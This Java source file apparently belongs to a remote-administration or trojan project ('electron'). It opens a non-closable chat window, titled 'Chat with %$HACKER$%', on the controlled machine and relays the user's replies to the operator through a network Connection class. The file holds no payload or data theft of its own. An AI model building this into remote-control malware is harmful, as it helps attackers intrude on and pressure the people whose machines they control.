package electron.functions;

import java.awt.Dimension;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.JTextField;

import electron.networking.Connection;

public class Chat {
	static JTextArea chat;
	static JTextField answer;
	static JButton button;
	private static JFrame frame = new JFrame("Chat with %$HACKER$%");
	private static boolean isCreated = false;

	public static String create() {
		if (isCreated)
			return "[CHAT][ERROR]: already created!";
		frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
		frame.getContentPane().add(new ChatGUI());
		frame.setResizable(false);
		frame.pack();
		frame.setVisible(true);
		chat.setLineWrap(true);
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String message = answer.getText();
				answer.setText("");
				Connection.sendMessage("[CHAT][USER]: " + message);
				chat.setText(chat.getText() + "\n $YOU: " + message);
			}
		});
		isCreated = true;
		return "[CHAT]: created.";
	}

	public static String setTop(boolean val) {
		if (val) {
			frame.setAlwaysOnTop(true);
			return "[CHAT]: now chat is always on top.";
		} else {
			frame.setAlwaysOnTop(false);
			return "[CHAT]: now chat isn't always on top.";
		}
	}

	public static String hide() {
		frame.setVisible(false);
		return "[CHAT]: hidden.";
	}

	public static String showMessage(String message) {
		create();
		chat.setText(chat.getText() + "\n $HACKER:" + message);
		return "[CHAT]: &HACKER:" + message;
	}

	public static String clearChat() {
		chat.setText("$CHAT: chat cleared.");
		return "[CHAT]: chat cleared.";
	}

}

class ChatGUI extends JPanel {
	public ChatGUI() {
		Chat.chat = new JTextArea(5, 5);
		Chat.answer = new JTextField(5);
		Chat.button = new JButton("Answer");
		Chat.answer.setToolTipText("Write message here");
		setPreferredSize(new Dimension(396, 329));
		setLayout(null);
		add(Chat.chat);
		add(Chat.answer);
		add(Chat.button);
		Chat.chat.setBounds(5, 5, 385, 285);
		Chat.answer.setBounds(5, 295, 300, 25);
		Chat.button.setBounds(310, 295, 80, 25);
	}
}
